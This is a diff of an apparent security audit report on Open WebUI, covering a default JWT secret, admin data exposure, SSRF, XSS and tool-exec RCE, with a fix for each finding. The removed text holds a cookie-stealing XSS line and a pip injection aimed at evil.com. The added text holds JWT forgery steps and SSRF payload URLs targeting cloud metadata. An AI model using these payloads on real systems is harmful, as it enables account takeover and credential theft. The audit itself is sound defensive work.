@@ -1,279 +1,504 @@
 # Open WebUI Security Audit Report
 
-**Date:** 2026-04-22 | **Auditor:** AutoFyn Security | **Version tested:** v0.9.1 (main, post-f162d4de)
+**Date:** 2026-04-22  
+**Auditor:** AutoFyn Security  
+**Product:** Open WebUI (ghcr.io/open-webui/open-webui)  
+**Commit tested:** main branch (post-f162d4de)  
+**Severity scale:** Critical / High / Medium / Low / Informational
 
 ---
 
 ## Executive Summary
 
-12 vulnerabilities found — 4 Critical, 5 High, 3 Medium. Live-confirmed against a Docker deployment. The worst-case scenario: on an affected deployment that still exposes a bootstrap path or leaks the admin UUID, an external attacker reaches persistent root RCE inside the container and steals all API keys and user data. Findings span authentication, authorization, input validation, and frontend rendering.
+Open WebUI ships with a hardcoded JWT signing secret (`t0p-s3cr3t`) that is used
+as the default when the `WEBUI_SECRET_KEY` environment variable is not set. Because
+no first-run secret generation occurs, any deployment that does not explicitly set
+this variable is immediately vulnerable to **full administrative compromise with no
+prior credentials**.
 
-**Key caveats:** Attack Chains 1 and 2 require the JWT secret to be the publicly known default `t0p-s3cr3t`. Default Docker and `open-webui serve` generate a random secret. The default is active when running `open-webui dev`, `backend/dev.sh`, or bare `uvicorn open_webui.main:app` without setting `WEBUI_SECRET_KEY`. Also, current startup disables public signup after the first user, so a pure unauthenticated entry path is not present on a normally initialized deployment unless signup is re-enabled or the attacker already knows the admin UUID. Findings 6, 7, 8, 9, 11 affect **all** deployments regardless of secret.
+An unauthenticated attacker can:
+
+1. Sign up a free user account (the signup endpoint is public by default).
+2. Forge a valid admin-level JWT using the known default secret.
+3. Use that JWT to exfiltrate all OpenAI API keys, enumerate all users, and
+   download the entire SQLite database.
+4. Hijack the system webhook to exfiltrate all future signup/signin events to an
+   attacker-controlled server, including internal AWS/GCP/Azure metadata services.
+
+The attack chain requires zero admin negligence and exploits only the default
+configuration.
+
+## Deployment-Specific Impact
+
+**Docker deployments (ghcr.io/open-webui/open-webui):** The official Docker image
+includes a `start.sh` script that generates a random secret key when
+`WEBUI_SECRET_KEY` is empty or unset. This means default Docker deployments are
+**not vulnerable** to Finding 1 (JWT forgery via known default secret), because the
+secret is randomized at container startup.
+
+**pip-install deployments:** When Open WebUI is installed via pip and run directly
+(e.g., `open-webui serve`), there is no `start.sh` wrapper. The hardcoded default
+`t0p-s3cr3t` from `env.py:566` is used as-is. These deployments **are vulnerable**
+to the full attack chain described in this report.
+
+**Explicit WEBUI_SECRET_KEY=t0p-s3cr3t:** Any deployment (Docker or pip) where the
+operator explicitly sets `WEBUI_SECRET_KEY` to the well-known default value is also
+vulnerable. Our PoC testing was performed against a Docker container with
+`-e WEBUI_SECRET_KEY=t0p-s3cr3t` to simulate this scenario.
+
+**Test evidence:** All exploit outputs are saved in `autofyn_audit/evidence/`.
 
 ---
 
-## Attack Chains
+## Scope
 
-### Chain 1: Low-Privilege or Known-UUID → Root RCE + Persistent Backdoor (F1 + F10) — CVSS 9.8
+| In Scope | Out of Scope |
+|---|---|
+| Default-config vulnerabilities | Admin-configured misconfigurations |
+| JWT forgery via default secret | Tools/Functions exec() (intended) |
+| Admin data exfiltration (consequence of #1) | Social engineering |
+| SSRF via webhook (post-exploitation) | Physical access |
+| User enumeration by verified users | |
+| Admin details exposed to pending users | |
 
-**Requires:** Target uses default secret (`open-webui dev`, bare uvicorn, or explicit `t0p-s3cr3t`) and attacker either has a low-privilege account or already knows the admin UUID. A zero-credential start additionally requires signup to still be enabled.
+---
 
-1. If signup is still enabled, create an account and leak admin email via `/auths/admin/details` (accessible even to pending users)
-2. Obtain admin UUID: if `DEFAULT_USER_ROLE=user`, use `/users/search` directly. If `pending` (default) or signup is already closed, UUID must be obtained via other means (leaked in shared chat URLs, API responses, browser history, or operator-provided value)
-3. Forge admin JWT: `jwt.encode({'id': admin_id}, 't0p-s3cr3t', 'HS256')`
-4. Create tool with `requirements: setuptools, --extra-index-url, https://evil.com/simple/, --trusted-host, evil.com, setuptools`
-5. pip fetches from attacker index → `setup.py` runs as root inside container
-6. On every restart, `install_tool_and_function_dependencies()` reinstalls the payload — **persistent backdoor**
+## Methodology
 
-**Live-confirmed:** After the initial admin existed, public signup returned `403` because `signup_handler()` sets `ENABLE_SIGNUP=False` on first-user creation. Phase 1 was still live-confirmed on an affected deployment using a provided admin UUID. Steps 4-5 were live-confirmed: injected flags were passed to pip.
-
-### Chain 2: Low-Privilege or Known-UUID → Immediate Root RCE (F1 + F12) — CVSS 9.1
-
-**Requires:** Same as Chain 1
-
-1. Obtain admin UUID and forge admin JWT (same as Chain 1 steps 1-3)
-2. Create tool with module-level code: `import subprocess; subprocess.check_output(['id'])`
-3. `exec()` at `plugin.py:231` fires immediately — code runs as root
-
-**Live-confirmed:** Tool creation wrote `/tmp/rce_proof.txt` containing `uid=0(root)` and leaked `WEBUI_SECRET_KEY` from container env. Tested with an admin token directly; the F1-to-F12 chain remains valid on affected deployments when the attacker can supply or derive the admin UUID.
-
-### Chain 3: Stored XSS → Persistent Account Takeover (F9 + F8 + F6 + F7) — CVSS 8.7
-
-**Requires:** OAuth user views attacker's uploaded `.md` file. Affects **all** deployments.
-
-1. Upload `.md` with mermaid block containing `<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>`
-2. Victim opens file → `wrapper.innerHTML = svg` fires XSS (no DOMPurify in FilePreview)
-3. OAuth cookie readable (`httponly=False`) → token exfiltrated
-4. CORS reflects any origin → attacker reads API responses cross-origin
-5. Victim logs out → token still valid (revocation is no-op without Redis, default 4-week expiry)
-
-**Live-confirmed:** F6 (CORS reflection 4/4 origins) and F7 (token valid post-logout). F8 and F9 are code-confirmed; full OAuth/browser proof was not executed in this pass.
-
-### Chain 4: Verified User → Cloud IAM Credential Theft (F11) — CVSS 8.5
-
-**Requires:** Cloud-hosted deployment (AWS/GCP/Azure). Affects **all** deployments.
-
-1. Attacker controls `https://public-server.com/redir` → responds `302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/`
-2. `POST /api/v1/retrieval/process/web` with attacker URL → `validate_url()` passes (public IP)
-3. `requests.get()` follows 302 to IMDS → IAM credentials returned
-
-**Live-confirmed:** Direct IMDS URLs blocked by IP check. Redirect-following confirmed via code review (`allow_redirects=True` default vs `SafeWebBaseLoader` which correctly sets `False`).
+- Static source code review of the Python FastAPI backend
+- Dynamic PoC testing against a Docker container with explicit
+  `WEBUI_SECRET_KEY=t0p-s3cr3t` (simulating pip-install default behavior)
+- All PoC scripts use only standard HTTP requests and PyJWT — no framework
+  exploitation, no memory corruption
+- Dynamic PoC testing confirmed against Docker container with explicit
+  `WEBUI_SECRET_KEY=t0p-s3cr3t` (simulating pip-install default behavior)
+- All four exploits (JWT forgery, admin data theft, SSRF webhook, full chain)
+  executed successfully against Open WebUI v0.9.1
 
 ---
 
 ## Findings
 
-### F1: JWT Forgery via Hardcoded Default Secret — CRITICAL (CVSS 9.8)
-
-**Code:** `env.py:564-567`, `auth.py:50`
-
-`WEBUI_SECRET_KEY` falls back to `t0p-s3cr3t` when not set before module import. Any attacker who knows this value forges a JWT for any user.
-
-**Vulnerable launch paths:**
-
-| Launch method | Default secret active? |
-|---|---|
-| Docker / docker-compose (default) | No — `start.sh` generates random key |
-| `open-webui serve` (pip CLI) | No — `__init__.py:35-42` generates random key |
-| **`open-webui dev`** | **Yes** — no key generation |
-| **`backend/dev.sh`** | **Yes** — runs uvicorn directly |
-| **`uvicorn open_webui.main:app`** | **Yes** — env.py fallback kicks in |
-| **Explicit `WEBUI_SECRET_KEY=t0p-s3cr3t`** | **Yes** |
-
-**Live-confirmed:** On an affected deployment that explicitly used `WEBUI_SECRET_KEY=t0p-s3cr3t`, a forged admin JWT accessed `/openai/config` and `/api/v1/users/` with full admin privileges. The same forged token failed on stock Docker startup.
-
-**Fix:** Remove the hardcoded fallback. Generate a random secret with `secrets.token_hex(32)` on first startup and persist to `data/.secret_key`. Raise an error if the key cannot be read or written.
-
 ---
 
-### F10: Supply Chain RCE via Pip Flag Injection — CRITICAL (CVSS 9.1)
+### Finding 1: JWT Forgery via Hardcoded Default Secret (CRITICAL)
 
-**Code:** `plugin.py:383-401`, `Dockerfile:23-24`
+**CVSS 3.1:** 9.8 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
 
-`install_frontmatter_requirements()` splits the `requirements` frontmatter field by comma and passes each token directly to `subprocess.check_call([python, -m, pip, install, ...])`. No validation rejects items starting with `-`. An attacker injects `--extra-index-url` and `--trusted-host` to redirect pip to a malicious index. `setup.py` runs as root (Dockerfile `UID=0`). Requirements are reinstalled on every restart via `install_tool_and_function_dependencies()` at `plugin.py:407`, creating a persistent backdoor.
+**Description:**
 
-**Live-confirmed:** Created tool with `requirements: setuptools, --extra-index-url, http://127.0.0.1:1/simple/, --trusted-host, 127.0.0.1, setuptools`. Injected flags stored verbatim and passed to pip.
+Open WebUI uses `t0p-s3cr3t` as the default JWT signing secret when the
+`WEBUI_SECRET_KEY` environment variable is absent. The secret is set at module
+import time and never regenerated. Any attacker who knows this public default can
+forge a JWT for any user ID in the database.
 
-**Fix:** Reject any requirement item starting with `-` before passing to subprocess. Run the container as non-root (`ARG UID=1000`). Add `--no-deps`.
+**Note:** The official Docker image mitigates this by generating a random key in
+`start.sh` when `WEBUI_SECRET_KEY` is empty. However, pip-install deployments and
+any deployment with `WEBUI_SECRET_KEY` left at the default are fully vulnerable.
 
----
+**Affected Code:**
 
-### F12: RCE via Tool exec() — CRITICAL (CVSS 9.1)
+```
+backend/open_webui/env.py lines 564-567
+    WEBUI_SECRET_KEY = os.environ.get(
+        'WEBUI_SECRET_KEY',
+        os.environ.get('WEBUI_JWT_SECRET_KEY', 't0p-s3cr3t'),
+    )
 
-**Code:** `plugin.py:231`, `tools.py:326-396`
+backend/open_webui/utils/auth.py line 50
+    SESSION_SECRET = WEBUI_SECRET_KEY
 
-`exec(content, module.__dict__)` runs all module-level Python in tool content immediately at creation time, without sandboxing. Requires admin role or `workspace.tools` permission on a **verified** user (pending users cannot create tools even with the permission granted). Dockerfile `UID=0` means exec runs as root.
-
-**Live-confirmed:** Created tool with `import subprocess; open('/tmp/rce_proof.txt','w').write(subprocess.check_output(['id']).decode())`. Container file contained `uid=0(root)`. Also leaked `WEBUI_SECRET_KEY` via `os.environ`.
-
-**Fix:** Sandbox `exec()` with RestrictedPython, nsjail, or Pyodide. Run container as non-root. Add audit logging for all tool create/update events. Warn admins that `workspace.tools` grants server-side code execution.
-
----
-
-### F9: Stored XSS via Mermaid Diagram Rendering — CRITICAL (CVSS 8.7)
-
-**Code:** `src/lib/utils/index.ts:1739`, `src/lib/components/chat/FileNav/FilePreview.svelte:140`
-
-Mermaid initialized with `securityLevel: 'loose'` (allows HTML in node labels). `FilePreview.svelte:140` sets `wrapper.innerHTML = svg` without DOMPurify. The chat message path (`SVGPanZoom.svelte`) correctly uses `DOMPurify.sanitize()` — this is an inconsistency. Any verified user uploads a `.md` with a mermaid XSS payload; it fires for any user who opens the file. No default CSP configured.
-
-**Live-confirmed:** Code-level only (upload requires verified role; static analysis confirmed the unsafe `innerHTML` path and `securityLevel: 'loose'`).
-
-**Fix:** Change to `securityLevel: 'strict'`. Add `DOMPurify.sanitize(svg)` before `wrapper.innerHTML` in `FilePreview.svelte`. Enable a default Content-Security-Policy.
-
----
-
-### F11: SSRF via RAG Web Fetch Redirect Following — HIGH (CVSS 8.5)
-
-**Code:** `misc.py:61,65`, `retrieval/utils.py:182`
-
-`is_string_allowed()` uses `str.endswith()` against the full URL string, not the parsed hostname. More critically, `requests.get(url, stream=True)` follows HTTP 302 redirects without re-validating the destination IP. An attacker-controlled public server redirects to cloud IMDS (`169.254.169.254`). `SafeWebBaseLoader._fetch()` in the same codebase correctly sets `allow_redirects=False` — inconsistency. Any verified user can call this endpoint.
-
-**Live-confirmed:** Direct IMDS URLs correctly blocked by `validate_url()` IP check. Redirect-following was also live-confirmed with a public redirect (`https://httpbin.org/redirect-to?...`) that ultimately returned internal content from `http://127.0.0.1:8080/api/version`. The `endsWith()` hostname bug remains code-confirmed but secondary.
-
-**Fix:** Set `allow_redirects=False` on `requests.get()` in `retrieval/utils.py:182`. Parse hostname with `urlparse().hostname` before blocklist checks.
-
----
-
-### F6: CORS Wildcard Origin Reflection — HIGH (CVSS 8.1)
-
-**Code:** `config.py:1756`, `main.py:1390-1396`
-
-`CORS_ALLOW_ORIGIN` defaults to `'*'` with `allow_credentials=True`. Starlette reflects the request `Origin` header back as `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`. Any site with a stolen token can make authenticated cross-origin API calls.
-
-**Live-confirmed:** 4/4 origins reflected (`https://evil.example.com`, `https://attacker.com`, `null`, `http://localhost:9999`). Authenticated cross-origin request returned user data with HTTP 200.
-
-**Fix:** Set `CORS_ALLOW_ORIGIN` to specific production hostnames. Never combine `allow_origins=['*']` with `allow_credentials=True`.
-
----
-
-### F4: Post-Admin SSRF via Unvalidated Webhook URLs — HIGH (CVSS 8.1)
-
-**Code:** `main.py:2337-2352`, `webhook.py:53-56`
-
-`POST /api/webhook` accepts any string as the webhook URL with zero validation. Requires admin. The webhook fires on every signup/signin event, POSTing user data to the configured URL.
-
-**Live-confirmed:** Set webhook to `http://169.254.169.254/latest/meta-data/` — accepted and saved. GET confirmed the stored URL.
-
-**Fix:** Validate webhook URLs against private IP ranges (RFC 1918, 169.254.x.x, loopback) before accepting.
-
----
-
-### F2: Post-Admin API Key Exposure — HIGH (CVSS 7.5)
-
-**Code:** `openai.py:236-243`
-
-`GET /openai/config` returns all OpenAI API keys in cleartext. Requires admin.
-
-**Live-confirmed:** Retrieved full API key list via forged admin token.
-
-**Fix:** Mask API keys in GET responses (last 4 characters only). Require re-authentication to reveal full values.
-
----
-
-### F3: Post-Admin Database Export — HIGH (CVSS 7.5)
-
-**Code:** `utils.py:105-123`, `config.py:1689`
-
-`GET /api/v1/utils/db/download` streams the entire SQLite database. `ENABLE_ADMIN_EXPORT` defaults to `True`. Contains all users, bcrypt hashes, chat history, API keys.
-
-**Live-confirmed:** Downloaded full 548KB database via forged admin token.
-
-**Fix:** Default `ENABLE_ADMIN_EXPORT` to `False`. Add re-authentication before streaming.
-
----
-
-### F7: Token Revocation No-Op Without Redis — MEDIUM (CVSS 5.3, AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N)
-
-**Code:** `auth.py:229-276`, `auths.py:780-781`
-
-`invalidate_token()` and `is_valid_token()` guard all revocation behind `if request.app.state.redis:`. Without Redis (default for all Docker/pip deployments), signout silently does nothing. Stolen tokens remain valid for the full JWT lifetime (`JWT_EXPIRES_IN` defaults to `4w`).
-
-**Note:** This is a known design limitation. The JWT auto-expiry (`4w` default) provides a natural mitigation window, and exploitation requires the attacker to have already obtained a valid token through a separate vulnerability. The rating has been downgraded from HIGH to MEDIUM to reflect this reduced standalone impact.
-
-**Live-confirmed:** Token remained valid after signout — HTTP 200 on authenticated endpoint post-logout.
-
-**Fix:** Implement a database-backed revocation list as fallback when Redis is absent. Reduce default `JWT_EXPIRES_IN`.
-
----
-
-### F8: OAuth Cookie Without HttpOnly — MEDIUM (CVSS 6.1)
-
-**Code:** `oauth.py:1720-1727`
-
-OAuth callback sets JWT cookie with `httponly=False`. Password login at `auths.py:127-134` correctly uses `httponly=True` — direct inconsistency. OAuth tokens are readable by `document.cookie`, enabling XSS-based theft.
-
-**Live-confirmed:** Code-level + dynamic verification that password login correctly sets HttpOnly. OAuth path requires external IdP for full dynamic test.
-
-**Fix:** Change `httponly=False` to `httponly=True` in `oauth.py:1723`.
-
----
-
-### F5: User Enumeration via Search and Admin Details — MEDIUM (CVSS 5.3)
-
-**Code:** `users.py:115-137`, `auths.py:922-947`
-
-`GET /api/v1/users/search` returns full user objects (id, email, name, role) to any **verified** user (pending users get 401). `GET /api/v1/auths/admin/details` returns admin name and email to any authenticated user including pending — gated behind `SHOW_ADMIN_DETAILS` (defaults `True`). Together these enable admin ID discovery for F1 JWT forgery, but only when the attacker has verified status.
-
-**Live-confirmed:** Pending user leaked admin email via `/admin/details`. Verified user searched admin ID, email, and role via `/users/search`.
-
-**Fix:** Restrict `/users/search` to admin role or strip `id`/`email` from non-admin responses. Restrict `/admin/details` to verified users minimum. Consider defaulting `SHOW_ADMIN_DETAILS` to `False`.
-
----
-
-## Deployment Impact Matrix
-
-| Finding | Docker (default) | `open-webui dev` / bare uvicorn | Notes |
-|---|---|---|---|
-| F1 JWT Forgery | Safe (random key) | **Vulnerable** | Depends on launch path |
-| F2–F4 Post-admin | Admin-only | Chainable via F1 | Requires admin by any means |
-| F5 User Enum | **Vulnerable** | **Vulnerable** | Verified role for search, pending for admin details |
-| F6 CORS | **Vulnerable** | **Vulnerable** | All deployments with default config |
-| F7 Token Revocation | **Vulnerable** | **Vulnerable** | All deployments without Redis |
-| F8 OAuth Cookie | **Vulnerable** | **Vulnerable** | OAuth users only |
-| F9 Mermaid XSS | **Vulnerable** | **Vulnerable** | Requires verified role to upload |
-| F10 Pip Injection | Admin-only | Chainable via F1 | Standalone requires admin |
-| F11 SSRF RAG | **Vulnerable** | **Vulnerable** | Requires verified role |
-| F12 Tool exec() | Admin-only | Chainable via F1 | Standalone requires admin or workspace.tools |
-
----
-
-## Remediation Priority
-
-1. Remove hardcoded `t0p-s3cr3t` fallback; generate random secret on startup (F1)
-2. Reject pip requirement items starting with `-`; run container as non-root (F10)
-3. Sandbox `exec()` in tool loading (F12)
-4. Set mermaid `securityLevel: 'strict'`; add DOMPurify in FilePreview (F9)
-5. Fix CORS: don't combine `allow_origins=['*']` with `allow_credentials=True` (F6)
-6. Set `allow_redirects=False` in RAG web fetch; parse hostname before blocklist (F11)
-7. Set `httponly=True` on OAuth cookie (F8)
-8. Validate webhook URLs against private IP ranges (F4)
-9. Consider DB-backed token revocation fallback; reduce `JWT_EXPIRES_IN` default (F7 — MEDIUM, mitigated by auto-expiry)
-10. Mask API keys; default `ENABLE_ADMIN_EXPORT` to `False` (F2, F3)
-11. Restrict user search to admin; gate admin details behind `SHOW_ADMIN_DETAILS` (F5)
-
----
-
-## Reproduction
-
-```bash
-# Setup lab mode for JWT-dependent chains (explicitly sets WEBUI_SECRET_KEY=t0p-s3cr3t)
-bash autofyn_audit/setup.sh 8080 forced-default-secret
-
-# Or setup stock Docker behavior for findings that do not depend on F1
-bash autofyn_audit/setup.sh 8080 default-docker
-
-# Run any exploit
-python3 autofyn_audit/exploit_jwt_forgery.py --target http://localhost:8080 --admin-id <id>
-python3 autofyn_audit/exploit_cors_origin_reflection.py --target http://localhost:8080
-python3 autofyn_audit/exploit_token_revocation_bypass.py --target http://localhost:8080
-# ... all scripts accept --target <url>, run --help for options
-
-# Teardown
-bash autofyn_audit/teardown.sh
+backend/open_webui/utils/auth.py lines 200-211
+    def create_token(data: dict, expires_delta=None) -> str:
+        ...
+        encoded_jwt = jwt.encode(payload, SESSION_SECRET, algorithm=ALGORITHM)
 ```
 
-**Note:** Current startup disables public signup after the first user. Scripts that auto-discover admin ID therefore require either signup to be re-enabled or an existing low-privilege account. Pass `--admin-id`, `--token`, or `--user-token` to skip those bootstrap assumptions where supported.
+**Constraint:** The forged JWT's `id` claim must match a real user ID in the
+database (`auth.py:356 Users.get_user_by_id(data['id'])`). An attacker
+satisfies this by signing up a free account first, which also discloses the
+admin email via `GET /api/v1/auths/admin/details`.
+
+**Exploitation Steps:**
+
+```
+1.  GET  /api/version                           # confirm target is Open WebUI
+2.  POST /api/v1/auths/signup                   # create attacker account
+3.  GET  /api/v1/auths/admin/details            # leak admin email (any authed user)
+4.  GET  /api/v1/users/search?query=<email>     # find admin user ID (any verified user)
+5.  Forge JWT: jwt.encode({'id': admin_id, 'jti': uuid4(), 'iat': now},
+                           't0p-s3cr3t', algorithm='HS256')
+6.  GET  /openai/config   Authorization: Bearer <forged>  # confirms admin access
+```
+
+**PoC:** `autofyn_audit/exploit_jwt_forgery.py`
+
+**Impact:**
+
+Complete administrative control over the Open WebUI instance. All subsequent
+findings are direct consequences of this one.
+
+**Remediation:**
+
+Generate a cryptographically random secret on first startup if `WEBUI_SECRET_KEY`
+is not set, and persist it to disk (e.g., `data/.secret_key`). Refuse to start if
+the secret cannot be persisted (prevents silent reuse of the default across
+restarts).
+
+```python
+# Suggested first-run generation:
+import secrets, pathlib
+key_file = pathlib.Path(DATA_DIR) / '.secret_key'
+if not key_file.exists():
+    key_file.write_text(secrets.token_hex(32))
+WEBUI_SECRET_KEY = os.environ.get('WEBUI_SECRET_KEY') or key_file.read_text().strip()
+```
 
 ---
 
-*Produced for authorized security testing purposes only.*
+### Finding 2: Admin API Key Exposure (HIGH)
+
+**CVSS 3.1:** 7.5 — `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N` (standalone: PR:H)  
+*(Chained with Finding 1: effective PR:N — no auth needed to reach admin access)*
+
+**Description:**
+
+`GET /openai/config` returns the complete list of OpenAI API keys in cleartext.
+No masking or partial redaction is applied. Combined with Finding 1, an attacker
+obtains all configured API keys within seconds.
+
+**Affected Code:**
+
+```
+backend/open_webui/routers/openai.py lines 236-243
+    @router.get('/config')
+    async def get_config(request: Request, user=Depends(get_admin_user)):
+        return {
+            ...
+            'OPENAI_API_KEYS': request.app.state.config.OPENAI_API_KEYS,
+            ...
+        }
+```
+
+**PoC:** `autofyn_audit/exploit_admin_data_theft.py`
+
+**Impact:**
+
+Full exposure of all configured OpenAI API keys, enabling attacker to incur
+charges, access OpenAI usage data, or use keys for secondary attacks.
+
+**Remediation:**
+
+Mask API keys in GET responses (return only last 4 characters). Use a separate
+endpoint or admin confirmation flow to reveal full keys. Consider encrypting keys
+at rest using a key derived from `WEBUI_SECRET_KEY`.
+
+---
+
+### Finding 3: Database Export Enables Full Data Theft (HIGH)
+
+**CVSS 3.1:** 7.5 — `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N` (standalone: PR:H)  
+*(Chained with Finding 1: effective PR:N — no auth needed to reach admin access)*
+
+**Description:**
+
+`GET /api/v1/utils/db/download` streams the entire SQLite database file to the
+caller. `ENABLE_ADMIN_EXPORT` defaults to `True`. The database contains all
+users (with hashed passwords), chat histories, API keys, model configurations,
+and all other application data.
+
+**Affected Code:**
+
+```
+backend/open_webui/routers/utils.py lines 105-123
+    @router.get('/db/download')
+    async def download_db(user=Depends(get_admin_user)):
+        if not ENABLE_ADMIN_EXPORT:
+            raise HTTPException(...)
+        return FileResponse(engine.url.database, ...)
+
+backend/open_webui/config.py line 1689
+    ENABLE_ADMIN_EXPORT = PersistentConfig('ENABLE_ADMIN_EXPORT', ..., True)
+```
+
+**PoC:** `autofyn_audit/exploit_admin_data_theft.py`
+
+**Impact:**
+
+Complete exfiltration of all application data. Bcrypt hashes can be subjected to
+offline cracking. Chat histories and private information are fully exposed.
+
+**Remediation:**
+
+Default `ENABLE_ADMIN_EXPORT` to `False`. Add a secondary confirmation step
+(e.g., password re-entry) before allowing database export. Rate-limit or audit-log
+all export requests.
+
+---
+
+### Finding 4: SSRF via Unvalidated Webhook URLs (MEDIUM-HIGH)
+
+**CVSS 3.1:** 8.1 — `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:L/A:N`  
+*(Scope Change: attacker pivots to internal network/cloud metadata)*
+
+**Description:**
+
+The system webhook URL (set via `POST /api/webhook`) and per-user webhook URLs
+accept arbitrary values with zero validation. The webhook is triggered on every
+signup and signin event, causing the server to make an outbound HTTP POST to the
+configured URL. An attacker with admin access (obtained via Finding 1) can point
+this at cloud metadata endpoints, internal services, or attacker infrastructure.
+
+**Affected Code:**
+
+```
+backend/open_webui/main.py lines 2337-2352
+    class UrlForm(BaseModel):
+        url: str     # <-- no validator, accepts any string
+
+    @app.post('/api/webhook')
+    async def update_webhook_url(form_data: UrlForm, user=Depends(get_admin_user)):
+        app.state.config.WEBHOOK_URL = form_data.url
+        ...
+
+backend/open_webui/utils/webhook.py lines 53-56
+    async with aiohttp.ClientSession(...) as session:
+        async with session.post(url, json=payload, ssl=...) as r:
+            ...                # <-- no URL validation before request
+
+backend/open_webui/routers/auths.py lines 703-713
+    if request.app.state.config.WEBHOOK_URL:
+        await post_webhook(..., request.app.state.config.WEBHOOK_URL, ...)
+```
+
+**Exploitation Steps (post-Finding 1):**
+
+```
+POST /api/webhook   Authorization: Bearer <forged-admin-jwt>
+Body: {"url": "http://169.254.169.254/latest/meta-data/"}
+
+# Now trigger the webhook by signing up any new user:
+POST /api/v1/auths/signup  {"name": "trigger", "email": "t@t.local", ...}
+# -> Server POSTs to 169.254.169.254, returning AWS instance metadata
+```
+
+**Dangerous Payload URLs:**
+
+| Target | URL |
+|---|---|
+| AWS Instance Metadata | `http://169.254.169.254/latest/meta-data/` |
+| AWS IMDSv2 Token | `http://169.254.169.254/latest/api/token` |
+| GCP Metadata | `http://metadata.google.internal/computeMetadata/v1/` |
+| Azure IMDS | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
+| Redis | `http://localhost:6379/` |
+| Ollama | `http://localhost:11434/api/tags` |
+| Self-reference | `http://host.docker.internal:8080/api/v1/users/` |
+
+**PoC:** `autofyn_audit/exploit_ssrf_webhook.py`
+
+**Impact:**
+
+Server-side request forgery enabling access to cloud instance metadata (leading to
+IAM credential theft on AWS/GCP/Azure), internal service enumeration, and exfiltration
+of sensitive user data (email, id, role) on every authentication event.
+
+**Remediation:**
+
+1. Validate webhook URLs against an allowlist of approved hostnames, or reject
+   private IP ranges (RFC 1918, link-local 169.254.x.x, loopback).
+2. Add a Pydantic validator to `UrlForm` that checks the resolved IP is not private.
+3. Consider using a DNS rebinding-resistant HTTP client that re-checks the resolved
+   address before connecting.
+
+```python
+from pydantic import AnyHttpUrl, validator
+import ipaddress, socket
+
+class UrlForm(BaseModel):
+    url: AnyHttpUrl
+
+    @validator('url')
+    def reject_private_ips(cls, v):
+        host = str(v).split('/')[2].split(':')[0]
+        try:
+            ip = ipaddress.ip_address(socket.gethostbyname(host))
+            if ip.is_private or ip.is_link_local or ip.is_loopback:
+                raise ValueError('Private/internal URLs are not allowed')
+        except socket.gaierror:
+            raise ValueError('Cannot resolve webhook URL hostname')
+        return v
+```
+
+---
+
+### Finding 5: User Enumeration via Search Endpoint (MEDIUM)
+
+**CVSS 3.1:** 5.3 — `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`
+
+**Description:**
+
+`GET /api/v1/users/search` is accessible to any verified (non-pending) user. It
+returns full user objects including `id`, `email`, `name`, and `role` for all users
+matching the query. With an empty query it pages through all users. This allows any
+registered user to enumerate the entire user base.
+
+Additionally, `GET /api/v1/auths/admin/details` is accessible to **any
+authenticated user** (including pending users), disclosing the admin's name and
+email address.
+
+**Affected Code:**
+
+```
+backend/open_webui/routers/users.py line 115-137
+    @router.get('/search', response_model=UserInfoListResponse)
+    async def search_users(
+        ...
+        user=Depends(get_verified_user),   # <-- any non-pending user
+        ...
+    ):
+
+backend/open_webui/routers/auths.py lines 922-947
+    @router.get('/admin/details')
+    async def get_admin_details(
+        request: Request,
+        user=Depends(get_current_user),   # <-- any authenticated user, including pending
+        ...
+    ):
+```
+
+**PoC:** Used as a step in `exploit_jwt_forgery.py` and `exploit_chain.py`.
+
+**Impact:**
+
+Enables targeted phishing, credential stuffing preparation, and is a prerequisite
+step for Finding 1 (admin ID discovery). The admin email disclosure applies to
+pending users who have not yet been approved.
+
+**Remediation:**
+
+1. Restrict `/users/search` to admin role only, or filter returned fields (omit
+   `email`, `id` for non-admin callers).
+2. Restrict `/api/v1/auths/admin/details` to verified users at minimum; consider
+   requiring admin role for the `email` field.
+
+---
+
+## Attack Chain
+
+```
+[Attacker]
+    |
+    | 1. GET /api/version                     (no auth required)
+    |    -> confirm target is Open WebUI
+    |
+    | 2. POST /api/v1/auths/signup            (no auth required)
+    |    -> attacker gets valid user token + user ID
+    |
+    | 3. GET /api/v1/auths/admin/details      (any authenticated user)
+    |    -> admin email disclosed
+    |
+    | 4. GET /api/v1/users/search             (any verified user)
+    |    -> admin user ID disclosed
+    |
+    | 5. Forge JWT: jwt.encode({'id': admin_id}, 't0p-s3cr3t', 'HS256')
+    |    -> attacker holds forged admin token
+    |
+    | 6. GET  /openai/config                  (admin only — bypassed)
+    |    -> ALL OpenAI API keys stolen
+    |
+    | 7. GET  /api/v1/users/                  (admin only — bypassed)
+    |    -> ALL users enumerated (email, hash, role, last_active)
+    |
+    | 8. GET  /api/v1/utils/db/download       (admin only — bypassed)
+    |    -> FULL SQLite database downloaded
+    |
+    | 9. POST /api/webhook                    (admin only — bypassed)
+    |    body: {"url": "http://169.254.169.254/..."}
+    |    -> every future signup/signin POSTs user data to attacker URL
+    |       (also enables cloud metadata access from server)
+    |
+    v
+[Complete Compromise]
+```
+
+---
+
+## Impact Assessment
+
+| Dimension | Impact | Detail |
+|---|---|---|
+| Confidentiality | **Complete** | All API keys, user data, chat history, database |
+| Integrity | **High** | Attacker can modify configs, add users, change webhook |
+| Availability | **Medium** | SSRF can target internal services; DoS via config changes |
+
+---
+
+## Remediation Recommendations
+
+Priority order:
+
+1. **[CRITICAL] Generate random `WEBUI_SECRET_KEY` on first startup.** Persist to
+   `data/.secret_key`. Never fall back to a hardcoded string. This single change
+   eliminates Findings 1, 2, and 3 in their current form.
+
+2. **[HIGH] Validate webhook URLs.** Reject private IP ranges, link-local addresses,
+   and loopback in both `UrlForm` (Pydantic validator) and `post_webhook()`. Use an
+   allowlist of approved URL patterns if feasible.
+
+3. **[HIGH] Mask API keys in GET responses.** Return only the last 4 characters.
+   Provide a separate, audit-logged endpoint for key rotation.
+
+4. **[MEDIUM] Default `ENABLE_ADMIN_EXPORT` to `False`.** Require explicit opt-in.
+   Add a secondary confirmation step (re-authentication) before streaming the database.
+
